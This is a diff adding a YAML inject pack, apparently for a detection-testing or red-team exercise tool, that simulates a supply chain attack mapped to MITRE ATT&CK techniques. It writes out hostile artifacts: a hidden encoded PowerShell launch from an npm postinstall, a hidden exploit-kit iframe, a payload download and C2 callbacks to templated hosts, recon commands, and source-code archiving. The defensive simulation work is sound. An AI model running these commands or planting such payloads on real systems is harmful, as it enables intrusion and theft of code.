@@ -1,0 +1,111 @@
+id: inject-supply-chain-attack
+name: Supply Chain Attack Inject Pack
+version: "1.0"
+description: |
+  Simulates a multi-vector supply chain compromise including a compromised npm
+  package, a malicious update to an internal tool, and a watering hole attack
+  via a vendor portal. Designed to exercise detection of trusted-source threats
+  and software integrity verification capabilities.
+mitre_attack:
+  - T1195.001  # Supply Chain Compromise: Compromise Software Dependencies
+  - T1195.002  # Supply Chain Compromise: Compromise Software Supply Chain
+  - T1189      # Drive-by Compromise (Watering Hole)
+  - T1059.007  # Command and Scripting Interpreter: JavaScript
+  - T1105      # Ingress Tool Transfer
+
+injects:
+  - id: compromised-npm-package
+    type: simulated_execution
+    delay_minutes: 0
+    params:
+      technique: T1195.001
+      description: "Developer installs a compromised npm package that contains a postinstall backdoor"
+      process_name: "node.exe"
+      command_line: "npm install lodash-utils@2.1.4"
+      artifacts:
+        - type: process_create
+          image: "C:\\Program Files\\nodejs\\node.exe"
+          command_line: "node -e \"require('child_process').exec('powershell -nop -w hidden -enc {{ encoded_payload }}')\""
+          parent_image: "C:\\Program Files\\nodejs\\node.exe"
+          description: "postinstall script spawns PowerShell"
+        - type: file_create
+          path: "C:\\Users\\{{ dev_user }}\\AppData\\Roaming\\npm\\node_modules\\lodash-utils\\postinstall.js"
+        - type: network_connection
+          dst_ip: "{{ c2_ip }}"
+          dst_port: 443
+          description: "Backdoor phones home to C2"
+
+  - id: malicious-internal-update
+    type: simulated_execution
+    delay_minutes: 10
+    depends_on: compromised-npm-package
+    params:
+      technique: T1195.002
+      description: "Attacker pushes malicious update to internal tool via compromised CI/CD pipeline"
+      commands:
+        - "git push origin main --force"
+        - "internal-tool-updater.exe --apply-update --source http://gitlab.corp.local/tools/agent/releases/v3.2.1"
+      artifacts:
+        - type: file_create
+          path: "C:\\Program Files\\InternalTool\\agent.exe"
+          hash_before: "SHA256:aabbccdd11223344..."
+          hash_after: "SHA256:eeff00112233..."
+          description: "Binary replaced with trojanized version"
+        - type: process_create
+          image: "C:\\Program Files\\InternalTool\\agent.exe"
+          child_process: "cmd.exe"
+          command_line: "cmd.exe /c whoami /all > C:\\Temp\\recon.txt"
+        - type: registry_modification
+          key: "HKLM\\SOFTWARE\\InternalTool\\AutoUpdate"
+          value: "Enabled"
+          data: "1"
+
+  - id: vendor-portal-watering-hole
+    type: http_burst
+    delay_minutes: 20
+    depends_on: malicious-internal-update
+    params:
+      technique: T1189
+      description: "Vendor support portal compromised with injected iframe leading to exploit kit"
+      target_url: "https://support.vendor-partner.com/portal"
+      method: GET
+      count: 15
+      artifacts:
+        - type: http_request
+          url: "https://support.vendor-partner.com/portal"
+          response_injected: '<iframe src="https://{{ exploit_domain }}/kit/landing" style="display:none">'
+        - type: http_request
+          url: "https://{{ exploit_domain }}/kit/landing"
+          description: "Exploit kit landing page"
+        - type: http_request
+          url: "https://{{ exploit_domain }}/kit/payload.exe"
+          description: "Second-stage payload download"
+        - type: process_create
+          image: "C:\\Users\\{{ target_user }}\\AppData\\Local\\Temp\\payload.exe"
+          parent_image: "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"
+
+  - id: supply-chain-c2-callback
+    type: http_burst
+    delay_minutes: 30
+    depends_on: vendor-portal-watering-hole
+    params:
+      description: "All three compromised vectors call back to shared C2 infrastructure"
+      url: "https://cdn-static.{{ c2_domain }}/api/health"
+      method: POST
+      count: 45
+      interval_seconds: 20
+      jitter_percent: 15
+
+  - id: supply-chain-data-collection
+    type: simulated_execution
+    delay_minutes: 40
+    depends_on: supply-chain-c2-callback
+    params:
+      technique: T1005
+      description: "Collect source code and internal documentation from developer workstation"
+      process_name: "powershell.exe"
+      command_line: 'Compress-Archive -Path "C:\Projects\*" -DestinationPath "C:\Temp\src-backup.zip"'
+      artifacts:
+        - type: file_create
+          path: "C:\\Temp\\src-backup.zip"
+          size_mb: 340
